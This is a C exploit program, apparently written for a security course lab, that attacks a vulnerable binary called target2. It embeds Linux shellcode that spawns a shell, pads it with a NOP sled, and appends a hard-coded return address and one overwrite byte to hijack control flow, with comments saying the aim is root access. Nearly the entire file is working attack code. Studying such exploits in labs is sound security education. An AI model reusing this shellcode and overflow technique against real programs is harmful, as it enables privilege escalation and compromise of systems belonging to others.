#include <stdio.h>
#include <unistd.h>

	char sc_linux[] =
	        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
            //Shellcode for linux

	main()
	{
        	int i, j;
        	char buffer[1024];

        	bzero(&buffer, 1024);//preparing thte payload for the attack
        	for (i=0;i<=(252-sizeof(sc_linux));i++)
        	{
                	buffer[i] = 0x90;
        	}
        	for (j=0,i=i;j<(sizeof(sc_linux)-1);i++,j++)
        	{
        	        buffer[i] = sc_linux[j];
        	}
        	buffer[i++] = 0xe8;//Target address were we will execute our shellcode.
       		buffer[i++] = 0xf4;
        	buffer[i++] = 0xff;
        	buffer[i++] = 0xbf;
        	buffer[i++] = 0x5c;//the byte we want to overwrite for causing the bufferoverflow. It corresponds to the las byte of our buffer in the program.
                               //This byte corresponds to the integer in the code of target2.c
                               //Overwriting this byte will make the stack pointer to jump to the position in memory we want, and then execute the shellcode,
                               //granting us the root access.

        	execl("./target2", "target2", buffer, NULL); //execute the target with the argument we added to it.

	}
